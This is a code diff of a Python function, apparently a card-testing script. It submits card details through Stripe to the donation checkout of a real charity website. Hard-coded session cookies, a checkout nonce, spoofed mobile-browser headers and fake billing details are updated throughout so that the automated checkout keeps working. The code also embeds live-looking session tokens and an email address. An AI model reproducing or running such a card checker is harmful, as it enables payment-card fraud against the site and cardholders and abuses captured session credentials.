@@ -35,30 +35,29 @@ def Tele(ccx):
     pm = r1.json()['id']
 
     cookies = {
+    'wp_woocommerce_session_fb9067bf2bd9a3b3ccef4307db7f3b0a': 't_16a1f16504b030d68932f34d33728c%7C%7C1734003318%7C%7C1733999718%7C%7C1fa61e98c5a4a35e6a1ad5f2b62ec5b9',
     'et-editor-available-post-10-fb': 'fb',
     'woocommerce_items_in_cart': '1',
-    'breeze_folder_name': '40faec270286c972a60e4a274bbf0f5c5990183d',
-    'wordpress_logged_in_fb9067bf2bd9a3b3ccef4307db7f3b0a': 'waznim.ey%7C1730955433%7Ctyox2xv5AUJzNdJA9us6wXm0InsPaPKGBBaL5hpFItr%7C3269a890d3e0d6a287a4990db63ce2fbc2eb297d12466757da3eba67e8f44f8d',
-    'wp_woocommerce_session_fb9067bf2bd9a3b3ccef4307db7f3b0a': '137%7C%7C1729916721%7C%7C1729913121%7C%7C26af710dbfee1d4c84c416ca2c96f086',
-    'mcfw-wp-user-cookie': 'MTM3fDB8NjN8NDAwNDBfMzMxNzhmM2QzYjc5MGUyNDE4YzRmN2MyMTZhMjcyNTdhMWY4NGUzZDJiNDhhNmNiM2NjZWNjZWIxNzAxMzZjZA%3D%3D',
     'woocommerce_cart_hash': '7af0e1fe87300d3f34677c2fe543ea89',
+    '__stripe_mid': '6435b6e6-38c6-4f3a-a130-9180662e73fcbf70a7',
+    '__stripe_sid': 'fecd519a-09b2-45a6-a121-cd9839c0a60b9a8f97',
 }
 
     headers = {
-    'authority': 'wecaretocoach.com',
     'accept': 'application/json, text/javascript, */*; q=0.01',
-    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
+    'accept-language': 'en-US',
     'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    # 'cookie': 'et-editor-available-post-10-fb=fb; woocommerce_items_in_cart=1; breeze_folder_name=40faec270286c972a60e4a274bbf0f5c5990183d; wordpress_logged_in_fb9067bf2bd9a3b3ccef4307db7f3b0a=waznim.ey%7C1730955433%7Ctyox2xv5AUJzNdJA9us6wXm0InsPaPKGBBaL5hpFItr%7C3269a890d3e0d6a287a4990db63ce2fbc2eb297d12466757da3eba67e8f44f8d; wp_woocommerce_session_fb9067bf2bd9a3b3ccef4307db7f3b0a=137%7C%7C1729916721%7C%7C1729913121%7C%7C26af710dbfee1d4c84c416ca2c96f086; mcfw-wp-user-cookie=MTM3fDB8NjN8NDAwNDBfMzMxNzhmM2QzYjc5MGUyNDE4YzRmN2MyMTZhMjcyNTdhMWY4NGUzZDJiNDhhNmNiM2NjZWNjZWIxNzAxMzZjZA%3D%3D; woocommerce_cart_hash=7af0e1fe87300d3f34677c2fe543ea89',
+    # 'cookie': 'wp_woocommerce_session_fb9067bf2bd9a3b3ccef4307db7f3b0a=t_16a1f16504b030d68932f34d33728c%7C%7C1734003318%7C%7C1733999718%7C%7C1fa61e98c5a4a35e6a1ad5f2b62ec5b9; et-editor-available-post-10-fb=fb; woocommerce_items_in_cart=1; woocommerce_cart_hash=7af0e1fe87300d3f34677c2fe543ea89; __stripe_mid=6435b6e6-38c6-4f3a-a130-9180662e73fcbf70a7; __stripe_sid=fecd519a-09b2-45a6-a121-cd9839c0a60b9a8f97',
     'origin': 'https://wecaretocoach.com',
+    'priority': 'u=1, i',
     'referer': 'https://wecaretocoach.com/donate/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'same-origin',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
     'x-requested-with': 'XMLHttpRequest',
 }
 
@@ -69,19 +68,19 @@ def Tele(ccx):
     data = {
     'billing_first_name': 'waznim',
     'billing_last_name': 'ey',
-    'billing_company': '',
+    'billing_company': 'waznimey',
     'billing_country': 'US',
     'billing_address_1': 'street 27',
     'billing_address_2': '',
-    'billing_city': 'newyork',
+    'billing_city': 'Newyork',
     'billing_state': 'NY',
     'billing_postcode': '10080',
-    'billing_phone': '2095455155',
-    'billing_email': 'waznimey@gmail.com',
+    'billing_phone': '+12014584566',
+    'billing_email': 'waznimey2022@gmail.com',
     'payment_method': 'stripe',
-    'woocommerce-process-checkout-nonce': 'f753bd9569',
+    'woocommerce-process-checkout-nonce': '59ebbcf536',
     '_wp_http_referer': '/?wc-ajax=update_order_review',
-    'stripe_source': ''+str(pm)+'',
+    'stripe_source': pm,
 }
 
     r2 = requests.post('https://wecaretocoach.com/', params=params, cookies=cookies, headers=headers, data=data)
